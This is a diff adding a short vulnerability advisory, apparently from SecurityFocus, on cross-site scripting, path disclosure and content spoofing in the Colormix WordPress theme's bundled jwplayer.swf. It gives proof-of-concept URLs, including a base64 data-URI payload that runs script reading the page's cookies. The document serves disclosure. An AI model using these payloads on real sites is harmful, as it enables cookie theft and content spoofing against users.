@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/59371/info
+
+The Colormix theme for WordPress is prone to multiple security vulnerabilities, including:
+
+1. A cross-site scripting vulnerability
+2. A path-disclosure vulnerability
+3. Multiple content-spoofing vulnerabilities
+
+An attacker may leverage these issues to obtain potentially sensitive information and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible. 
+
+Content spoofing:
+
+http://www.example.com/wp-content/themes/colormix/js/rokbox/jwplayer/jwplayer.swf?config=1.xml
+
+http://www.example.com/wp-content/themes/colormix/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=http://www.example1.com
+
+http://www.example.com/wp-content/themes/colormix/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&image=1.jpg
+
+http://www.example.com/wp-content/themes/colormix/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
+
+Cross-site scripting:
+
+http://www.example.com/wp-content/themes/colormix/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B 
